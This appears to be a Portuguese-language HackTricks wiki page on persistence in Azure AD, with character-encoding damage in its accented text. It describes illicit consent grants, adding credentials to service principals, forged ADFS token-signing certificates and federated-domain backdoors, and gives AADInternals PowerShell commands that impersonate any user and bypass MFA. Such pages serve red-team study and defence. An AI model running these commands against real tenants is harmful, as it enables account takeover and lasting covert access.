# Az - Persist√™ncia

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

### Concess√£o de Consentimento Il√≠cito

Por padr√£o, qualquer usu√°rio pode registrar um aplicativo no Azure AD. Assim, voc√™ pode registrar um aplicativo (apenas para o inquilino alvo) que precisa de permiss√µes de alto impacto com consentimento de administrador (e aprov√°-lo se voc√™ for o administrador) - como enviar e-mails em nome de um usu√°rio, gerenciamento de fun√ß√µes, etc. Isso nos permitir√° **executar ataques de phishing** que seriam muito **frut√≠feros** em caso de sucesso.

Al√©m disso, voc√™ tamb√©m poderia aceitar esse aplicativo com seu usu√°rio como uma forma de manter o acesso sobre ele.

### Aplicativos e Principais de Servi√ßo

Com privil√©gios de Administrador de Aplicativos, GA ou um papel personalizado com permiss√µes microsoft.directory/applications/credentials/update, podemos adicionar credenciais (secreto ou certificado) a um aplicativo existente.

√â poss√≠vel **mirar um aplicativo com altas permiss√µes** ou **adicionar um novo aplicativo** com altas permiss√µes.

Um papel interessante a ser adicionado ao aplicativo seria o **papel de administrador de autentica√ß√£o privilegiada**, pois permite **reiniciar a senha** de Administradores Globais.

Essa t√©cnica tamb√©m permite **contornar MFA**.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* Para autentica√ß√£o baseada em certificado

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### Federa√ß√£o - Certificado de Assinatura de Token

Com **privil√©gios de DA** no AD local, √© poss√≠vel criar e importar **novos certificados de assinatura de Token** e **certificados de descriptografia de Token** que t√™m uma validade muito longa. Isso nos permitir√° **fazer login como qualquer usu√°rio** cujo ImuutableID conhecemos.

**Execute** o comando abaixo como **DA no(s) servidor(es) ADFS** para criar novos certificados (senha padr√£o 'AADInternals'), adicion√°-los ao ADFS, desativar a rota√ß√£o autom√°tica e reiniciar o servi√ßo:
```powershell
New-AADIntADFSSelfSignedCertificates
```
Ent√£o, atualize as informa√ß√µes do certificado com o Azure AD:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Federa√ß√£o - Dom√≠nio Confi√°vel

Com privil√©gios de GA em um locat√°rio, √© poss√≠vel **adicionar um novo dom√≠nio** (deve ser verificado), configurar seu tipo de autentica√ß√£o como Federado e configurar o dom√≠nio para **confiar em um certificado espec√≠fico** (any.sts no comando abaixo) e emissor:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## Refer√™ncias

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
